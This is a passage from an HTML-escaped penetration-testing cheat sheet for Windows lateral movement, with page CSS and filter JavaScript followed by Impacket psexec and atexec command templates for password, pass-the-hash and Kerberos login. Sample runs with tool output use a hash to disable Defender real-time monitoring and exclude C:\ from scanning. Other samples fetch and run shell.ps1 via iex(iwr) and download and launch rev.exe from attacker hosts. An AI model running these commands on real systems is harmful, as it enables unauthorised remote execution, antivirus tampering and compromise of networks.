.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;psexec---interactive-shell&#34;&gt;PsExec - Interactive Shell&lt;/h3&gt;&#xA;&lt;h4 id=&#34;domain&#34;&gt;Domain&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; -k&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -k -no-pass&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;local-auth&#34;&gt;Local auth&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;h3 id=&#34;atexec---run-immediate-scheduled-task&#34;&gt;AtExec - Run Immediate Scheduled Task&lt;/h3&gt;&#xA;&lt;h4 id=&#34;domain-1&#34;&gt;Domain&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; -k &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -k &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;local-auth-1&#34;&gt;Local Auth&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;WORKGROUP&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;WORKGROUP/test:test@192.168.10.2&amp;#39; &amp;#39;powershell.exe -c &amp;#34;iex(iwr http://192.168.10.1:8443/shell.ps1 -UseBasicParsing)&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-atexec &amp;#39;&amp;lt;WORKGROUP&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -hashes :&amp;lt;HASH&amp;gt; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 &lt;span class=&#34;s1&#34;&gt;&amp;#39;WS01/administrator@WS01.example.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell.exe -c &amp;#34;Set-MpPreference -DisableRealtimeMonitoring $true&amp;#34;&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[!] This will work ONLY on Windows &amp;gt;= Vista&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Creating task \gNBJCrJi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Running task \gNBJCrJi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Deleting task \gNBJCrJi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Attempting to read ADMIN$\Temp\gNBJCrJi.tmp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;                                                                                                                                                            &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 &lt;span class=&#34;s1&#34;&gt;&amp;#39;WS01/administrator@WS01.example.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell.exe -c &amp;#34;Set-MpPreference -ExclusionPath C:\\&amp;#34;&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[!] This will work ONLY on Windows &amp;gt;= Vista&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Creating task \cbUEDAaz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Running task \cbUEDAaz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Deleting task \cbUEDAaz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Attempting to read ADMIN$\Temp\cbUEDAaz.tmp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;                                                                                                                                                            &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 &lt;span class=&#34;s1&#34;&gt;&amp;#39;WS01/administrator@WS01.example.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell.exe -c &amp;#34;iwr 10.8.7.13:8443/rev.exe -outfile C:\programdata\rev.exe&amp;#34;&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[!] This will work ONLY on Windows &amp;gt;= Vista&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Creating task \RmSAvink&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Running task \RmSAvink&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Deleting task \RmSAvink&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Attempting to read ADMIN$\Temp\RmSAvink.tmp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;                                                                                                                                                            &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 &lt;span class=&#34;s1&#34;&gt;&amp;#39;WS01/administrator@WS01.example.com&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell.exe -c &amp;#34;C:\programdata\rev.exe&amp;#34;&amp;#39;&lt;/span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span 